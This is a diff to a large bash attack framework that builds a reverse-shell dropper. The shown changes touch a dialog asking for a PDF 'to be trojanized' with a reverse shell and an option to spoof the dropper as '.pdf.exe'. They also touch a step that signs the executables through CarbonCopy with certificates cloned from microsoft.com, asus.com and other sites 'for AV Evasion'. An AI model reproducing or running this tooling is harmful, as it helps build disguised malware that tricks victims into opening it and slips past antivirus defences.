@@ -113,13 +113,13 @@ EnV=`hostnamectl | grep Chassis | awk {'print $2'}` > /dev/null 2>&1
 # Config user system correct arch (wine+mingw)
 # --------------------------------------------
 if [ "$ArCh" = "x86" ]; then
-   arch="wine"
-   PgFi="Program Files"
-   ComP="i586-mingw32msvc-gcc"
+   arch="wine"                 # Wine cmd line syntax
+   PgFi="Program Files"        # Wine Program Files directory
+   ComP="i586-mingw32msvc-gcc" # Mingw32 GCC library
 elif [ "$ArCh" = "x64" ]; then
-   arch="wine64"
-   PgFi="Program Files"
-   ComP="i686-w64-mingw32-gcc"
+   arch="wine64"               # Wine cmd line syntax
+   PgFi="Program Files"        # Wine Program Files directory
+   ComP="i686-w64-mingw32-gcc" # Mingw-W64 GCC library
 else
    echo "${RedF}[x]${white} ERROR: Wrong value input: [ $ArCh ]: not accepted ..${Reset}"
    echo "${RedF}[x]${white} Edit [ settings ] File and Set the var: SYSTEM_ARCH= ${Reset}"
@@ -12944,7 +12944,7 @@ fi
 
 ## Store User Inputs (module bash variable declarations)..
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
-lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 443" --entry --width 300) > /dev/null 2>&1
 UpL=$(zenity --title "☠ CHOSE ONE PDF DOC TO BE TROJANIZED ☠" --filename=$IPATH --file-selection --text "Input one PDF document to be embbebed with our revshell") > /dev/null 2>&1
 ## Make sure attacker have sellected one PDF doc
 TestExtension=$(echo $UpL|cut -d '.' -f2)    # store extension sellection
@@ -13007,7 +13007,8 @@ Spoof=$(zenity --list --title "☠ SPOOF DROPPER EXTENSION ? ☠" --text "\nDo y
 if [ "$Spoof" = "$Drop.pdf.exe (spoof)" ]; then echo "${BlueF}[${YellowF}i${BlueF}]${white} Spoofing dropper.exe extension (.pdf.exe)"${Reset};sleep 2;fi
 
 
-## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
+## SIGN EXECUTABLE (@paranoidninja - CarbonCopy)
+# GITHUB: https://github.com/paranoidninja/CarbonCopy
 easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 if [ "$easter_egg" = "ON" ]; then
 
@@ -13023,14 +13024,23 @@ if [ "$easter_egg" = "ON" ]; then
       echo "" && sudo apt-get install osslsigncode && pip3 install pyopenssl && echo ""
    fi
 
-   ## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
-   echo "${BlueF}[☠]${white} Sign Executable for AV Evasion (CarbonCopy) .."${Reset};sleep 2
-   conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
-   if [ "$conv" "<" "3" ]; then SSL_domain="www.microsoft.com"; else SSL_domain="www.asus.com";fi
+   ## SIGN EXECUTABLE (@paranoidninja - CarbonCopy)
+   echo "${BlueF}[☠]${white} Sign Executable for AV Evasion (CarbonCopy)"${Reset};sleep 2
+   ## Ramdomly chose a domain name to clone certs from
+   conv=$(cat /dev/urandom | tr -dc '1-4' | fold -w 1 | head -n 1)
+   if [ "$conv" = "1" ]; then
+      SSL_domain="www.asus.com"
+   elif [ "$conv" = "2" ]; then
+      SSL_domain="www.microsoft.com"
+   elif [ "$conv" = "3" ]; then
+      SSL_domain="www.myplaycity.com"
+   else
+      SSL_domain="www.googlestore.com"
+   fi
    echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate:${YellowF} $SSL_domain"${Reset};sleep 2
    cd $IPATH/obfuscate
    cp $IPATH/bin/Client.exe $IPATH/output/Client.exe
-   xterm -T "CarbonCopy - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2 && python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/Client.exe $IPATH/output/signed-Client.exe && sleep 2"
+   xterm -T "CarbonCopy - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2 && echo "" && python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/Client.exe $IPATH/output/signed-Client.exe && sleep 2"
    mv $IPATH/output/signed-Client.exe $IPATH/output/Client.exe
    mv $IPATH/output/signed-$Drop.exe $IPATH/output/$Drop.exe
    rm -r certs > /dev/nul 2>&1
